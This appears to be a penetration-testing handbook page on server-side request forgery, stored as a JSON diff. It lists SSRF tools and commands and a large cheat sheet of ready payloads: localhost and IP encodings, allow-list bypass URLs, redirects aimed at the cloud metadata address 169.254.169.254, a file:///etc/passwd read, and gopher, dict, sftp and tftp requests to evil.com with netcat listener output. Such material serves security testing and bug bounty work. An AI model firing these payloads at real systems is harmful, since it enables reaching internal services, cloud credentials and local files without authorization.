@@ -1,0 +1,93 @@
+{
+    "title": "SSRF",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "skill_level": "Intermediate",
+    "prerequisites": "Networking, cloud architecture",
+    "sections": [
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/tarunkant/Gopherus",
+                "gopherus --exploit [PLATFORM]",
+                "# https://github.com/daeken/SSRFTest",
+                "# https://github.com/jmdx/TLS-poison/",
+                "# https://github.com/m4ll0k/Bug-Bounty-Toolz",
+                "# https://github.com/cujanovic/SSRF-Testing",
+                "# https://github.com/bcoles/ssrf_proxy",
+                "",
+                "gau domain.com | python3 ssrf.py collab.listener.com",
+                "",
+                "# https://github.com/micha3lb3n/SSRFire",
+                "./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt",
+                "",
+                "# SSRF Redirect Payload generator",
+                "# https://tools.intigriti.io/redirector/"
+            ]
+        },
+        {
+            "heading": "Summary",
+            "type": "paragraph",
+            "content": "{% hint style=\"info\" %}\nServer-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.\n{% endhint %}\n``bash\n# Web requesting other ip or ports like 127.0.0.1:8080 or 192.168.0.1\nchat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000\nGET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1\n``"
+        },
+        {
+            "heading": "SSRF Attacks",
+            "type": "paragraph",
+            "content": "``bash\n# Check if you're able to enum IP or ports\n127.0.0.1\n127.0.1\n127.1\n127.000.000.001\n2130706433\n0x7F.0x00.0x00.0x01\n0x7F.1\n0x7F000001\n# Quick URL based bypasses:\nhttp://google.com:80+&@127.88.23.245:22/#+@google.com:80/\nhttp://127.88.23.245:22/+&@google.com:80#+@google.com:80/\nhttp://google.com:80+&@google.com:80#+@127.88.23.245:22/\nhttp://127.88.23.245:22/?@google.com:80/\nhttp://127.88.23.245:22/#@www.google.com:80/\n# 301 responses:\nhttps://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg\nhttps://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg\nhttps://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg\nhttps://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg\n# 301 json:\nhttps://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json\nhttps://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json\nhttps://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json\nhttps://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json\n# 301 csv:\nhttps://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv\nhttps://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv\nhttps://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv\nhttps://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv\n# 301 xml:\nhttps://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml\nhttps://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml\nhttps://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml\nhttps://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml\n# 301 pdf:\nhttps://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf\nhttps://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf\nhttps://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf\nhttps://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf\n# 30x custom:\nhttps://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json\n# 20x custom:\nhttps://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json\n# 201 custom:\nhttps://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json\n# HTML iframe + URL bypass\nhttp://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/\n# SFTP\nhttp://whatever.com/ssrf.php?url=sftp://evil.com:11111/\nevil.com:$ nc -v -l 11111\nConnection from [192.168.0.10] port 11111 [tcp/] accepted (family 2, sport 36136)\nSSH-2.0-libssh21.4.2\n# Dict\nhttp://safebuff.com/ssrf.php?dict://attacker:11111/\nevil.com:$ nc -v -l 11111\nConnection from [192.168.0.10] port 11111 [tcp/] accepted (family 2, sport 36136)\nCLIENT libcurl 7.40.0\n# gopher\n# http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php\n\nevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)\nHI\nMultiline\ntest\n# TFTP\n# http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET\nevil.com:# nc -v -u -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nTESTUDPPACKEToctettsize0blksize512timeout6\n# file\nhttp://safebuff.com/redirect.php?url=file:///etc/passwd\n# ldap\nhttp://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit\n# SSRF Bypasses\n?url=http://safesite.com&site.com\n?url=http://////////////site.com/\n?url=http://site@com/account/edit.aspx\n?url=http://site.com/account/edit.aspx\n?url=http://safesite.com?.site.com\n?url=http://safesite.com#.site.com\n?url=http://safesite.com\\.site.com/domain\n?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com\n?url=https://192.10.10.3/\n?url=https://192.10.10.2?.192.10.10.3/\n?url=https://192.10.10.2#.192.10.10.3/\n?url=https://192.10.10.2\\.192.10.10.3/\n?url=http://127.0.0.1/status/\n?url=http://localhost:8000/status/\n?url=http://site.com/domain.php\n\n# Localhost bypasses\n0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\n# Blind SSRF\n- Review Forms\n- Contact Us\n- Password fields\n- Contact or profile info (Names, Addresses)\n- User Agent\n# SSRF through video upload\n# https://hackerone.com/reports/1062888\n# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS\n# SSRF in pdf rendering\n\n`\nSSRF Bypasses\n`bash\nhttp://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37\nhttp://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d\nhttp://////////////site.com/\nhttp://0000::1:80/\nhttp://000330.0000072.0000326.00000343\nhttp://000NaN.000NaN\nhttp://0177.00.00.01\nhttp://017700000001\nhttp://0330.072.0326.0343\nhttp://033016553343\nhttp://0NaN\nhttp://0NaN.0NaN\nhttp://0x0NaN0NaN\nhttp://0x7f000001/\nhttp://0xd8.0x3a.0xd6.0xe3\nhttp://0xd8.0x3a.0xd6e3\nhttp://0xd8.0x3ad6e3\nhttp://0xd83ad6e3\nhttp://0xNaN.0xaN0NaN\nhttp://0xNaN.0xNa0x0NaN\nhttp://0xNaN.0xNaN\nhttp://127.0.0.1/status/\nhttp://127.1/\nhttp://2130706433/\nhttp://216.0x3a.00000000326.0xe3\nhttp://3627734755\nhttp://[::]:80/\nhttp://localhost:8000/status/\nhttp://NaN\nhttp://safesite.com#.site.com\nhttp://safesite.com&site.com\nhttp://safesite.com?.site.com\nhttp://safesite.com\\.site.com/domain\nhttp://shmilon.0xNaN.undefined.undefined\nhttp://site.com/account/edit.aspx\nhttp://site.com/domain.php\nhttp://site@com/account/edit.aspx\nhttp://whitelisted@127.0.0.1\nhttps://192.10.10.2#.192.10.10.3/\nhttps://192.10.10.2?.192.10.10.3/\nhttps://192.10.10.2\\.192.10.10.3/\nhttps://192.10.10.3/\nhttps://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com\n\n# Tool\n# https://h.43z.one/ipconverter/\n``"
+        },
+        {
+            "heading": "PDF SSRF",
+            "type": "link",
+            "title": "https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators",
+            "url": "https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators"
+        },
+        {
+            "heading": "Mindmap",
+            "type": "paragraph",
+            "content": ")"
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/ssrf.md",
+        "previous_page": {
+            "title": "SQLi",
+            "url": "/enumeration/web/sqli"
+        },
+        "next_page": {
+            "title": "Open redirects",
+            "url": "/enumeration/web/open-redirects"
+        }
+    }
+}
